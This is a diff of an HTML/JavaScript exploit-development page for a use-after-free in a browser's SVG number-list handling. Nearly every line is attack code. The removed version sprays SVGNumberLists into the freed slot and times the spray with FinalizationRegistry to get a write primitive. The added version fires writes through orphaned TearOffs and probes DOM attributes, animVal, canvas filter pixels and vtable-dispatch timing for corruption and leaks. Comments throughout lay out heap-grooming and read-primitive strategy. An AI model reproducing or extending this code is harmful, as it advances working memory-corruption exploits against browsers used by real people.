@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v70 — spray-before-write UAF confirmation + read primitive</title>
+<title>SVG UAF v71 — UAF vtable call side-effects + DOM leak + read primitive probe</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,13 +22,14 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v70 — spray-before-write · SVGNumberList bin UAF confirmation · read primitive probe</h2>
+<h2>SVG UAF v71 — UAF vtable dispatch side-effects · DOM leak probe · read primitive via filter output</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR76')">ADR76: spray SVGNumberLists BEFORE write → UAF write into sprayed list</button>
-  <button onclick="runSuite('ADR77')">ADR77: spray size calibration — measure list_A object size via spray density</button>
-  <button onclick="runSuite('ADR78')">ADR78: read primitive probe — stale ptr read via animVal after spray</button>
-  <button onclick="runSuite('ADR79')">ADR79: IsoHeap free-list confirm — spray 1000 lists, release 500, spray 1000 more, check for slot reuse</button>
+  <button onclick="runSuite('ADR80')">ADR80: DOM attribute leak — does UAF write propagate to element.getAttribute?</button>
+  <button onclick="runSuite('ADR81')">ADR81: canvas filter output — does UAF corrupt feColorMatrix filter output?</button>
+  <button onclick="runSuite('ADR82')">ADR82: vtable null-check probe — timing + crash test of notification chain</button>
+  <button onclick="runSuite('ADR83')">ADR83: multiple orphaned TearOffs writing same freed list_A → DOM state accumulation</button>
+  <button onclick="runSuite('ADR84')">ADR84: SVGNumber m_owner stale backptr — write AFTER list replaced — what does element see?</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -74,10 +75,6 @@ function fb(text,toast){
 var _dv=new DataView(new ArrayBuffer(8));
 function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
 function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
-function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
-function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
-function isPointerBits64(f){if(!isFinite(f)||isNaN(f))return false;var b=f64bits(f);return b.hi>=1&&b.hi<=0x00007fff;}
-function isPointerLike32(u){return u>=0x4F000000&&u<=0x52FFFFFF;}
 
 function gcHard(){
   var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
@@ -92,17 +89,24 @@ function gcDOM(){
 }
 function gcFull(){gcHard();gcDOM();gcHard();}
 
-// makeList: creates a feColorMatrix and returns its baseVal SVGNumberList TearOff + first item
-function makeList(id,canary){
-  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
+// Make feColorMatrix inside an SVG, return refs
+function makeFe(id,vals20){
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('width','100');svg.setAttribute('height','100');
+  document.body.appendChild(svg);
+  var filter=document.createElementNS(SVG_NS,'filter');
+  filter.id='flt_'+id;
+  svg.appendChild(filter);
   var fe=document.createElementNS(SVG_NS,'feColorMatrix');
   fe.setAttribute('type','matrix');
-  var v=[];for(var i=0;i<20;i++)v.push(i===0?canary:0);
-  fe.setAttribute('values',v.join(' '));
-  svg.appendChild(fe);
-  var list=fe.values.baseVal;    // SVGNumberList TearOff
-  var item=list.getItem(0);      // SVGNumber TearOff
-  return{svg:svg,fe:fe,list:list,item:item,canary:canary};
+  fe.setAttribute('values',vals20.join(' '));
+  filter.appendChild(fe);
+  return{svg:svg,filter:filter,fe:fe};
+}
+
+// Parse feColorMatrix values string to array of numbers
+function parseVals(attrStr){
+  return attrStr.trim().split(/\s+/).map(Number);
 }
 
 var suites={};
@@ -112,551 +116,570 @@ function runSuite(name){
   catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}
 }
 function runAll(){
-  ['ADR76','ADR77','ADR78','ADR79'].forEach(function(n){runSuite(n);});
+  ['ADR80','ADR81','ADR82','ADR83','ADR84'].forEach(function(n){runSuite(n);});
 }
 
 // ═══════════════════════════════════════════════════════════════
-// ADR76 — SPRAY-BEFORE-WRITE: core UAF write confirmation
+// ADR80 — DOM ATTRIBUTE LEAK
 //
-// CONFIRMED from v69:
-// - setAttributeNS → list_A freed (ADR73: listGCd=true)
-// - orphanedTearOff.value = X → notification fires → writes to freed list_A (ADR68+ADR73)
+// QUESTION: After orphanedTearOff.value = X (UAF write → notification fires
+// on freed list_A), does element.getAttribute('values') or the live baseVal
+// reflect the write?
 //
-// Plan:
-// 1. Create victim feColorMatrix (fe_victim)
-// 2. Get baseVal TearOff T_old (holds SVGNumber_old from list_A)
-// 3. setAttributeNS → list_A freed, T_old detached
-// 4. SPRAY: create 500 new feColorMatrix elements → 500 new SVGNumberLists
-//    → IsoHeap bump-alloc: these land AFTER list_A's freed slot (bump-only)
-//    → BUT: if IsoHeap has a freelist populated by list_A's freed slot,
-//      ONE of these 500 will land AT list_A's address
-// 5. For each of the 500 spray lists, set a unique canary at position [0]:
-//    spray[i].item[0].value = (i+1)*1000
-// 6. WRITE to T_old: T_old.value = 88888 → notification fires → writes to list_A's address
-// 7. Check: does any spray list have a corrupted [0] value?
-//    If spray[k] is at list_A's address: spray[k].item[0].value ≠ (k+1)*1000
-//    → CONFIRMED: write went to our sprayed list → we control what gets overwritten!
+// If itemChanged() on freed list_A runs (vtable intact), it calls:
+//   commitChange() → element.svgAttributeChanged() → element updates its
+//   values representation
 //
-// This is the UAF write primitive into controlled data.
+// The element's 'values' attr is now tied to list_B (after setAttributeNS).
+// BUT: if freed list_A's itemChanged propagates back to the element and
+// confuses the element into thinking list_A changed → might element reflect
+// list_A's old/freed data in getAttribute('values')?
 //
-// Size consideration: we don't know the exact offset within list_A that
-// the notification handler writes to. The corruption might be at any offset
-// within the SVGNumberList struct. The item[0].value is at some offset from
-// the list base. The write offset = where in list_A's struct the handler writes.
+// Also test: does animVal (SMIL) react to the notification from freed list_A?
+// animVal reads from SMIL's own data, so probably not.
 //
-// Run 3 rounds with different spray densities (100, 500, 1000 lists) to
-// maximize chances of hitting the freed slot.
+// Setup:
+// 1. Create feColorMatrix with values = [3.14, 0, ..., 0] (20 values)
+// 2. Get orphaned TearOff T_old pointing to SVGNumber_old in freed list_A
+// 3. setAttributeNS with new values = [0, 0, ..., 0]
+// 4. Record baseline: elem.getAttribute('values'), baseVal.getItem(0).value
+// 5. Write T_old.value = 99.99 → UAF notification fires
+// 6. Record after: elem.getAttribute('values'), baseVal.getItem(0).value
+// 7. Any change = DOM leaked freed list_A data
 // ═══════════════════════════════════════════════════════════════
-suites['ADR76']=function(){
-  L('ADR76: spray-before-write UAF confirmation — 3 rounds','info');
+suites['ADR80']=function(){
+  L('ADR80: DOM attribute leak — does UAF notification update element.getAttribute?','info');
 
-  function doRound(roundNum,sprayCount,cb){
-    L('ADR76 round'+roundNum+': sprayCount='+sprayCount,'info');
+  // Create victim with distinctive initial values
+  var initVals=[];
+  for(var i=0;i<20;i++) initVals.push(i===0?3.14:i*0.1);
+  var o80=makeFe('80a',initVals);
+  L('ADR80: initial values[0]='+o80.fe.values.baseVal.getItem(0).value.toFixed(4),'info');
+  L('ADR80: initial getAttribute='+o80.fe.getAttribute('values').substring(0,40)+'...','info');
 
-    // Create victim
-    var victim=makeList('v76r'+roundNum,5555);
-    L('  victim list_A created, bv[0]='+victim.item.value,'info');
+  // Grab orphaned TearOff
+  var T80=o80.fe.values.baseVal.getItem(0);
+  L('ADR80: T80.value='+T80.value.toFixed(4)+' (pre-setAttr)','info');
 
-    // Grab orphan TearOff
-    var T_old=victim.fe.values.baseVal.getItem(0);
+  // setAttributeNS → frees list_A, creates list_B with all zeros
+  var zeros20=[];for(var i=0;i<20;i++)zeros20.push(0);
+  o80.fe.setAttributeNS(null,'values',zeros20.join(' '));
 
-    // setAttributeNS → frees list_A
-    var nv=[];for(var i=0;i<20;i++)nv.push(i===0?9999:0);
-    victim.fe.setAttributeNS(null,'values',nv.join(' '));
-    L('  setAttributeNS done → list_A freed','info');
-    L('  T_old.value='+T_old.value+' (detached, still 5555)','info');
+  // Baseline after setAttr
+  var baseline_attr=o80.fe.getAttribute('values');
+  var baseline_bv0=o80.fe.values.baseVal.getItem(0).value;
+  L('ADR80: BASELINE after setAttr:','info');
+  L('  getAttribute='+baseline_attr.substring(0,50)+'...','info');
+  L('  baseVal[0]='+baseline_bv0+' (should be 0)','info');
+  L('  T80.value='+T80.value.toFixed(4)+' (orphaned, still '+initVals[0].toFixed(4)+'?)','info');
 
-    // SPRAY: create sprayCount new SVGNumberLists
-    var spray=[];
-    for(var i=0;i<sprayCount;i++){
-      var s=makeList('s76r'+roundNum+'_'+i,(i+1)*1000);
-      spray.push(s);
+  // UAF write — various values to test
+  var writeValues=[99.99, 12345.678, -7777.7, 0.000001];
+  writeValues.forEach(function(wv,wi){
+    L('ADR80: writing T80.value='+wv+' (attempt '+wi+')','warn');
+    try{T80.value=wv;}catch(e){L('  write threw: '+e.message,'miss');return;}
+
+    var after_attr=o80.fe.getAttribute('values');
+    var after_bv0=o80.fe.values.baseVal.getItem(0).value;
+    var attr_changed=(after_attr!==baseline_attr);
+    var bv_changed=(Math.abs(after_bv0-baseline_bv0)>0.0001);
+
+    if(attr_changed){
+      L('★★★ ADR80: getAttribute CHANGED after UAF write!','hit');
+      L('  before='+baseline_attr.substring(0,50),'hit');
+      L('  after='+after_attr.substring(0,50),'hit');
+    } else {
+      L('  getAttribute: unchanged (UAF notification did NOT update attribute)','info');
     }
-    L('  sprayed '+sprayCount+' SVGNumberLists (canaries '+(1*1000)+' to '+(sprayCount*1000)+')','info');
+    if(bv_changed){
+      L('★★★ ADR80: baseVal[0] CHANGED: '+baseline_bv0+' → '+after_bv0,'hit');
+    } else {
+      L('  baseVal[0]: unchanged (='+after_bv0+')','info');
+    }
 
-    // WRITE to orphaned TearOff → notification chain → fires on freed list_A
-    var writeVal=88888;
-    L('  *** WRITING T_old.value='+writeVal+' → notification to freed list_A ***','warn');
-    try{T_old.value=writeVal;}catch(e){L('  write threw: '+e.message,'miss');}
+    // Check T80 itself
+    L('  T80.value after write='+T80.value.toFixed(4),'info');
+  });
 
-    // CHECK spray lists for corruption
-    var corrupted=[];
-    for(var i=0;i<spray.length;i++){
-      var expected=(i+1)*1000;
-      var got=spray[i].item.value;
-      if(Math.abs(got-expected)>0.5){
-        corrupted.push({i:i,expected:expected,got:got,bits:f32hex(got)});
+  // Test with SMIL animation running → does animVal react?
+  L('ADR80-B: with SMIL animation — does animVal react to UAF notification?','info');
+  var animVals80=[];for(var i=0;i<20;i++)animVals80.push(i===0?1:0);
+  var o80b=makeFe('80b',animVals80);
+  var anim80=document.createElementNS(SVG_NS,'animate');
+  anim80.setAttribute('attributeName','values');
+  anim80.setAttribute('from',animVals80.join(' '));
+  var toVals80=[];for(var i=0;i<20;i++)toVals80.push(i===0?1000:0);
+  anim80.setAttribute('to',toVals80.join(' '));
+  anim80.setAttribute('dur','10s');
+  anim80.setAttribute('repeatCount','indefinite');
+  o80b.fe.appendChild(anim80);
+
+  var T80b=o80b.fe.values.baseVal.getItem(0);
+  var av80b_before;
+  requestAnimationFrame(function(){
+    av80b_before=o80b.fe.values.animVal.getItem(0).value;
+    L('ADR80-B: animVal before UAF write='+av80b_before.toFixed(4),'info');
+
+    // free list_A via setAttr
+    o80b.fe.setAttributeNS(null,'values',zeros20.join(' '));
+
+    // write to orphaned TearOff
+    try{T80b.value=88888;}catch(e){L('write threw: '+e,'miss');}
+
+    requestAnimationFrame(function(){
+      var av80b_after=o80b.fe.values.animVal.getItem(0).value;
+      var avChanged=(Math.abs(av80b_after-av80b_before)>0.001 && av80b_after!==88888-1 /* paranoia */);
+      L('ADR80-B: animVal after UAF write='+av80b_after.toFixed(4),'info');
+      if(Math.abs(av80b_after-88888)<1){
+        L('★★★ ADR80-B: animVal reads UAF write value! (88888 propagated)','hit');
+      } else if(avChanged){
+        L('ADR80-B: animVal changed but not to write value: '+av80b_after.toFixed(4),'warn');
+      } else {
+        L('ADR80-B: animVal unchanged (SMIL ignores freed list notification)','info');
       }
-    }
+      o80b.svg.remove();
+    });
+  });
 
-    if(corrupted.length>0){
-      L('★★★ ADR76 round'+roundNum+': '+corrupted.length+' SPRAY LISTS CORRUPTED → UAF WRITE HIT!','hit');
-      corrupted.forEach(function(x){
-        L('  spray['+x.i+']: expected='+x.expected+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');
-      });
-    } else {
-      L('  ADR76 round'+roundNum+': 0 corruptions (spray didn\'t land at freed slot — bump-only)','info');
-    }
+  o80.svg.remove();
+};
 
-    // Also check: T_old itself (notification may have mutated it)
-    L('  T_old.value after write='+T_old.value,'info');
+// ═══════════════════════════════════════════════════════════════
+// ADR81 — CANVAS FILTER OUTPUT CORRUPTION
+//
+// If the UAF notification fires on freed list_A AND somehow propagates
+// to the element's filter pipeline, the feColorMatrix would apply
+// corrupted matrix values to the pixel data.
+//
+// Test:
+// 1. Create SVG with feColorMatrix filter applied to a rect
+// 2. Read canvas pixel output before UAF write (record RGBA)
+// 3. Trigger UAF write: T_old.value = X (large value like 99999)
+// 4. Read canvas pixel output after UAF write
+// 5. Any pixel change = filter pipeline used freed list_A data
+//
+// This is the most sensitive indicator: even a 1-bit change in any
+// pixel component would confirm the filter used corrupted matrix values.
+//
+// Note: we need to render the SVG to canvas. On iOS, cross-origin canvas
+// taint might apply to SVG. Use an inline SVG on canvas.
+// ═══════════════════════════════════════════════════════════════
+suites['ADR81']=function(){
+  L('ADR81: canvas filter pixel output — does UAF corrupt feColorMatrix rendering?','info');
 
-    // Also check: victim's new baseVal (list_B)
-    L('  victim bv[0] after write='+victim.fe.values.baseVal.getItem(0).value+' (should be 9999)','info');
+  // Create SVG with filter
+  var svg81=document.createElementNS(SVG_NS,'svg');
+  svg81.setAttribute('xmlns',SVG_NS);
+  svg81.setAttribute('width','50');svg81.setAttribute('height','50');
+  document.body.appendChild(svg81);
 
-    // Cleanup
-    spray.forEach(function(s){s.svg.remove();});
-    victim.svg.remove();
-    T_old=null;
+  var defs81=document.createElementNS(SVG_NS,'defs');
+  svg81.appendChild(defs81);
+  var filter81=document.createElementNS(SVG_NS,'filter');
+  filter81.id='flt81';
+  defs81.appendChild(filter81);
 
-    if(cb) setTimeout(cb,50);
+  var fe81=document.createElementNS(SVG_NS,'feColorMatrix');
+  fe81.setAttribute('type','matrix');
+  // Identity matrix
+  var identity=[1,0,0,0,0, 0,1,0,0,0, 0,0,1,0,0, 0,0,0,1,0];
+  fe81.setAttribute('values',identity.join(' '));
+  filter81.appendChild(fe81);
+
+  var rect81=document.createElementNS(SVG_NS,'rect');
+  rect81.setAttribute('x','0');rect81.setAttribute('y','0');
+  rect81.setAttribute('width','50');rect81.setAttribute('height','50');
+  rect81.setAttribute('fill','red');// red rect → RGB (255,0,0,255)
+  rect81.setAttribute('filter','url(#flt81)');
+  svg81.appendChild(rect81);
+
+  // Canvas render helper
+  function renderToCanvas(callback){
+    try{
+      var canvas=document.createElement('canvas');
+      canvas.width=50;canvas.height=50;
+      var ctx=canvas.getContext('2d');
+      var svgBlob=new Blob([new XMLSerializer().serializeToString(svg81)],{type:'image/svg+xml'});
+      var url=URL.createObjectURL(svgBlob);
+      var img=new Image();
+      img.onload=function(){
+        ctx.drawImage(img,0,0);
+        URL.revokeObjectURL(url);
+        try{
+          var px=ctx.getImageData(10,10,1,1).data;
+          callback(null,px);
+        }catch(e){callback('getImageData fail: '+e.message,null);}
+      };
+      img.onerror=function(){callback('img load fail',null);};
+      img.src=url;
+    }catch(e){callback('renderToCanvas: '+e.message,null);}
   }
 
-  doRound(1,100,function(){
-    doRound(2,500,function(){
-      doRound(3,1000,null);
+  // Grab orphaned TearOff before setAttr
+  var T81=fe81.values.baseVal.getItem(0);
+  L('ADR81: T81.value='+T81.value+' (should be 1, identity[0])','info');
+
+  // Render before UAF
+  renderToCanvas(function(err,px_before){
+    if(err){L('ADR81: canvas render before failed: '+err,'miss');svg81.remove();return;}
+    L('ADR81: pixel before UAF: R='+px_before[0]+' G='+px_before[1]+' B='+px_before[2]+' A='+px_before[3],'info');
+
+    // Now setAttributeNS → free list_A
+    fe81.setAttributeNS(null,'values',identity.join(' '));// re-set same values (new list_B = same identity)
+    var T81b=fe81.values.baseVal.getItem(0);
+    L('ADR81: T81b.value='+T81b.value+' (new list_B, should be 1)','info');
+
+    // The PREVIOUS T81 is now orphaned (list_A freed)
+    // Write extreme value to orphaned TearOff → notification fires on freed list_A
+    L('ADR81: writing T81.value=999 (extreme) via orphaned TearOff','warn');
+    try{T81.value=999;}catch(e){L('write threw: '+e.message,'miss');}
+
+    // Render after UAF
+    renderToCanvas(function(err2,px_after){
+      if(err2){L('ADR81: canvas render after failed: '+err2,'miss');svg81.remove();return;}
+      L('ADR81: pixel after UAF:  R='+px_after[0]+' G='+px_after[1]+' B='+px_after[2]+' A='+px_after[3],'info');
+
+      var changed=(px_before[0]!==px_after[0]||px_before[1]!==px_after[1]||px_before[2]!==px_after[2]||px_before[3]!==px_after[3]);
+      if(changed){
+        L('★★★ ADR81: PIXEL CHANGED after UAF write → filter used corrupted matrix!','hit');
+        L('  delta: R='+(px_after[0]-px_before[0])+' G='+(px_after[1]-px_before[1])+' B='+(px_after[2]-px_before[2]),'hit');
+      } else {
+        L('ADR81: pixels unchanged — UAF notification did NOT reach filter pipeline','info');
+      }
+
+      // Also test: write via T81 to super-extreme value (clamp behavior)
+      try{T81.value=9999999;}catch(e){}
+      renderToCanvas(function(err3,px_extreme){
+        if(!err3){
+          var changed2=(px_before[0]!==px_extreme[0]||px_before[1]!==px_extreme[1]||px_before[2]!==px_extreme[2]||px_before[3]!==px_extreme[3]);
+          L('ADR81: pixel after extreme write (9999999): R='+px_extreme[0]+' G='+px_extreme[1]+' B='+px_extreme[2],'info');
+          if(changed2) L('★★★ ADR81: PIXEL CHANGED at extreme value!','hit');
+        }
+        svg81.remove();
+      });
     });
   });
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR77 — SPRAY SIZE CALIBRATION
+// ADR82 — VTABLE NULL-CHECK PROBE
 //
-// The spray-before-write may fail if we don't know the freed list_A's
-// address. IsoHeap bump-only means freed slots aren't reused → spray
-// lands AFTER list_A → no hit. To get a hit we need to CONFIRM free-list.
+// Key question: does the notification chain on freed list_A CRASH or
+// succeed? ADR68 confirmed it succeeds. WHY?
 //
-// This test measures: what is the IsoHeap allocation density for
-// SVGNumberList? If we can detect address patterns via observable behavior,
-// we can potentially figure out if free-list is populated.
+// Hypothesis A: m_owner is null-checked before dispatch:
+//   if (m_owner) m_owner->itemChanged()
+//   m_owner is NON-NULL (still holds old address) → dispatch fires
+//   → vtable dispatch on freed memory → IsoHeap keeps page → vtable intact → runs
 //
-// Indirect test: create N lists, check if getItem(0).value for a NEWLY
-// created list equals 0 (zero-initialized) or something else.
-// If IsoHeap reuses a freed slot: the new list would land at old address.
-// The old address had known data. If IsoHeap does NOT zero on reuse:
-//   new list's getItem(0).value = whatever was at that address before
-//   (which is 0 if freed slot was zeroed, or old value if not zeroed)
+// Hypothesis B: m_owner is checked AND freed list_A vtable is zeroed:
+//   m_owner is non-null → check passes → m_owner->vtable[N] at zeroed memory → reads 0x0
+//   → indirect call to 0x0 → CRASH (page fault at 0x0 in userspace)
+//   But: we did NOT crash in ADR68 → this hypothesis is WRONG
+//   → Therefore: either vtable is NOT zeroed, OR dispatch is skipped another way
 //
-// Combined with canary: create list with canary=X, free it, alloc new list,
-// check if new list.item[0] = X (unzeroed reuse) or 0 (zeroed reuse) or
-// our initialized value (no reuse).
+// Test: force GC of the TearOff BEFORE writing (so TearOff is GC'd,
+// TearOff's RefPtr to SVGNumber_old drops, SVGNumber_old freed if nobody else holds it).
+// If TearOff is GC'd first → SVGNumber_old freed → m_value inaccessible →
+// Writing to T_old after TearOff GC'd = writing to freed TearOff JS wrapper
+// = different UAF (JSC GC heap vs bmalloc IsoHeap)
+// Might crash. Might work. New test.
 //
-// Also: use FinalizationRegistry to know EXACTLY when list_A is freed,
-// then immediately spray to maximize hit chance.
+// Actually: after TearOff GC'd, accessing T_old from JS = accessing dead JSC object
+// = strong JSC crash (dangling JS ptr). We should NOT test this.
+//
+// SAFER test for ADR82: timing the notification chain.
+// - Time 1000 writes to LIVE baseVal TearOff (normal, no UAF)
+// - Time 1000 writes to ORPHANED TearOff (UAF, list_A freed)
+// - If UAF write is SLOWER: vtable dispatch on freed memory is happening (reading from uncached freed page)
+// - If UAF write is SAME SPEED: possible null check early exit (faster) OR vtable is in cache
+// - If UAF write is FASTER: early null check before dispatch (jumps out early)
+//
+// This timing fingerprints whether the notification chain goes THROUGH the freed object
+// or is cut off before it.
 // ═══════════════════════════════════════════════════════════════
-suites['ADR77']=function(){
-  L('ADR77: spray with FinalizationRegistry timing — spray exactly when list_A freed','info');
+suites['ADR82']=function(){
+  L('ADR82: vtable null-check timing probe — notification chain through freed vs live list','info');
 
-  if(typeof FinalizationRegistry==='undefined'){
-    L('ADR77: FinalizationRegistry not supported','miss');return;
+  // Baseline: timing of write to LIVE baseVal TearOff (full notification chain)
+  var iVals=[];for(var i=0;i<20;i++)iVals.push(i===0?1:0);
+  var o82live=makeFe('82live',iVals);
+
+  // Warm up
+  for(var w=0;w<100;w++){
+    var tw=o82live.fe.values.baseVal.getItem(0);
+    tw.value=w*0.1;
   }
 
-  // Registry fires when list is GC'd → spray immediately in callback
-  var listFreedCallback=null;
-  var reg77=new FinalizationRegistry(function(token){
-    L('ADR77: FinalizationRegistry callback → '+token+' freed!','warn');
-    if(token==='list_A' && listFreedCallback){
-      listFreedCallback();
-    }
-  });
+  // Time 1000 writes to live baseVal TearOff
+  var ITER=1000;
+  var t0_live=performance.now();
+  for(var i=0;i<ITER;i++){
+    var t=o82live.fe.values.baseVal.getItem(0);
+    t.value=i*0.001+1;
+  }
+  var t1_live=performance.now();
+  var time_live=t1_live-t0_live;
+  L('ADR82: LIVE TearOff: '+ITER+' writes → '+time_live.toFixed(2)+'ms ('+((time_live/ITER)*1000).toFixed(1)+'µs/write)','info');
+  o82live.svg.remove();
 
-  // Create victim
-  var victim77=makeList('v77',3333);
-  var T_old77=victim77.fe.values.baseVal.getItem(0);
+  // UAF: timing of write to ORPHANED TearOff (list_A freed)
+  var o82uaf=makeFe('82uaf',iVals);
+  var T_uaf=o82uaf.fe.values.baseVal.getItem(0);
 
-  // Register the list (not item) with FinalizationRegistry
-  reg77.register(victim77.list,'list_A');
-  L('ADR77: victim list_A registered, bv[0]='+T_old77.value,'info');
+  // Warm up orphaned write
+  o82uaf.fe.setAttributeNS(null,'values',iVals.join(' '));
+  var T_uaf2=o82uaf.fe.values.baseVal.getItem(0);
+  o82uaf.fe.setAttributeNS(null,'values',iVals.join(' '));
+  var T_uaf3=o82uaf.fe.values.baseVal.getItem(0);
 
-  // setAttributeNS → detaches T_old77, starts freeing list_A
-  var nv77=[];for(var i=0;i<20;i++)nv77.push(i===0?8888:0);
-  victim77.fe.setAttributeNS(null,'values',nv77.join(' '));
-  L('ADR77: setAttributeNS done → list_A detached, T_old77 orphaned','info');
+  // setAttributeNS → free list_A, T_uaf3 is orphaned
+  o82uaf.fe.setAttributeNS(null,'values',iVals.join(' '));
+  var T_orphan=T_uaf3;
 
-  // Drop list reference so GC can collect it
-  victim77.list=null;
+  // Time 1000 writes to orphaned TearOff
+  var t0_uaf=performance.now();
+  for(var i=0;i<ITER;i++){
+    T_orphan.value=i*0.001+1;
+  }
+  var t1_uaf=performance.now();
+  var time_uaf=t1_uaf-t0_uaf;
+  L('ADR82: ORPHAN TearOff: '+ITER+' writes → '+time_uaf.toFixed(2)+'ms ('+((time_uaf/ITER)*1000).toFixed(1)+'µs/write)','info');
 
-  // Set up the callback: spray when FinalizationRegistry fires
-  listFreedCallback=function(){
-    L('ADR77: list_A GC confirmed → spraying 200 SVGNumberLists NOW','warn');
+  var ratio=time_uaf/time_live;
+  L('ADR82: ratio orphan/live='+ratio.toFixed(3),'info');
+  if(ratio<0.5){
+    L('★★★ ADR82: orphan write MUCH FASTER → early null-check exit (notification skipped!)','hit');
+    L('  Implication: m_owner null check runs, m_owner=0 (freed zeroed) → skips dispatch','info');
+  } else if(ratio>2.0){
+    L('★★★ ADR82: orphan write MUCH SLOWER → full vtable dispatch on freed memory (cache miss)','hit');
+    L('  Implication: vtable intact, full itemChanged() fires on freed list_A','info');
+  } else if(ratio>1.3){
+    L('ADR82: orphan write moderately slower ('+ratio.toFixed(2)+'x) → possible vtable dispatch + cache miss','warn');
+  } else {
+    L('ADR82: orphan write similar speed ('+ratio.toFixed(2)+'x) — inconclusive','info');
+  }
 
-    // Spray 200 lists immediately after GC confirmation
-    var spray77=[];
-    for(var i=0;i<200;i++){
-      spray77.push(makeList('sp77_'+i,(i+1)*777));
-    }
-    L('ADR77: 200 lists sprayed (canaries 777..154200)','info');
+  o82uaf.svg.remove();
 
-    // Write to orphaned TearOff
-    L('ADR77: WRITING T_old77.value=55555 → notification chain','warn');
-    try{T_old77.value=55555;}catch(e){L('write threw: '+e.message,'miss');}
+  // Additional: does the write to orphan TearOff update ANY observable DOM property?
+  L('ADR82-B: checking all observable properties after orphan write','info');
+  var o82b=makeFe('82b',iVals);
+  var T82b=o82b.fe.values.baseVal.getItem(0);
+  o82b.fe.setAttributeNS(null,'values',iVals.join(' '));
 
-    // Check spray
-    var bad77=[];
-    spray77.forEach(function(s,i){
-      var exp=(i+1)*777;
-      var got=s.item.value;
-      if(Math.abs(got-exp)>0.5) bad77.push({i:i,exp:exp,got:got,bits:f32hex(got)});
-    });
+  // Record baseline state
+  var before_attr=o82b.fe.getAttribute('values');
+  var before_bv0=o82b.fe.values.baseVal.getItem(0).value;
+  var before_items=o82b.fe.values.baseVal.numberOfItems;
 
-    if(bad77.length>0){
-      L('★★★ ADR77: '+bad77.length+' CORRUPTED after timed spray!','hit');
-      bad77.forEach(function(x){
-        L('  spray['+x.i+']: exp='+x.exp+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');
-      });
-    } else {
-      L('ADR77: 0 corruptions — IsoHeap bump-only confirmed (no slot reuse even with perfect timing)','info');
-    }
+  // UAF write
+  try{T82b.value=55555;}catch(e){}
 
-    spray77.forEach(function(s){s.svg.remove();});
-    victim77.svg.remove();
-  };
+  // Check everything
+  var after_attr=o82b.fe.getAttribute('values');
+  var after_bv0=o82b.fe.values.baseVal.getItem(0).value;
+  var after_items=o82b.fe.values.baseVal.numberOfItems;
 
-  // Force GC to trigger the registry callback
-  gcFull();
-  setTimeout(function(){
-    gcFull();
-    setTimeout(function(){
-      gcFull();
-      L('ADR77: all GC rounds done','info');
-    },200);
-  },200);
+  L('ADR82-B: getAttribute changed? '+(before_attr!==after_attr),'info');
+  L('ADR82-B: baseVal[0] changed? '+(Math.abs(before_bv0-after_bv0)>0.001)+' ('+before_bv0+'→'+after_bv0+')','info');
+  L('ADR82-B: numberOfItems changed? '+(before_items!==after_items)+' ('+before_items+'→'+after_items+')','info');
+
+  o82b.svg.remove();
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR78 — READ PRIMITIVE PROBE
+// ADR83 — MULTIPLE ORPHANED TEAROFFS → SAME FREED list_A
 //
-// Setup: SMIL animation running on feColorMatrix.
-// The animated SVGNumber is held alive by SMIL's RefPtr.
-// The per-frame animVal TearOff is freed (ADR72 confirmed: 20/20 GC'd).
+// Create 20 baseVal TearOffs all pointing to the same list_A.
+// setAttributeNS → frees list_A. All 20 TearOffs are now orphaned.
+// Write to all 20. Each fires notification → 20 itemChanged() calls on freed list_A.
 //
-// SMIL's RefPtr points to ONE animated SVGNumber (mutated in-place each frame).
-// When we get an animVal TearOff per frame, it's a new JS wrapper but
-// same underlying C++ SVGNumber (SMIL mutates it in-place).
+// Does anything observable happen after 20 writes?
+// Does cumulative UAF notification cause any DOM state change?
+// Does it crash? (20 vtable dispatches on freed memory)
 //
-// WHAT IF: we spray a controlled SVGNumber AT the freed TearOff's JS wrapper
-// address? The TearOff JS wrapper is a JSC object, allocated in JSC GC heap,
-// not in bmalloc IsoHeap. So different allocator. But:
+// Also: different value each time → each write to different orphaned TearOff =
+// different SVGNumber (list_A had 20 items, each TearOff holds a different item).
+// So we're writing to 20 DIFFERENT freed SVGNumbers, all firing notifications
+// to the same freed list_A.
 //
-// What about reading STALE data? After per-frame TearOff is GC'd:
-// - The C++ TearOff object itself gets freed (bmalloc-allocated C++ object)
-// - Freed C++ TearOff goes to... bmalloc regular malloc? or IsoHeap?
-// - TearOff size = sizeof(SVGPropertyTearOff<SVGNumberList::ItemProperty>) = ?
-//
-// New approach: the float values from animVal might leak internal C++ pointers.
-// In particular: when a C++ object is freshly freed (zeroed by bmalloc),
-// the NEXT allocation at that address would read 0. But if bmalloc doesn't
-// zero freed IsoHeap slots, the next allocation reads old data.
-//
-// Test: observe initial value of a NEWLY CREATED SVGNumber at a potentially
-// reused IsoHeap slot. If initial value ≠ 0 and ≠ initialized value:
-//   → something left data in that slot → possible pointer leak
-//
-// Specifically: create many lists, record their canary values. Free half.
-// Allocate new lists. Read their getItem(0).value BEFORE any .setAttribute.
-// If any reads a value that looks like a pointer (isPointerLike32) → info leak.
-//
-// Caveat: the SVGNumber is initialized to 0 by the SVGNumberList when parsing
-// the 'values' attribute. So even on reused slot, the initialization overwrites.
-// This makes initial-value-as-pointer-read unlikely.
-//
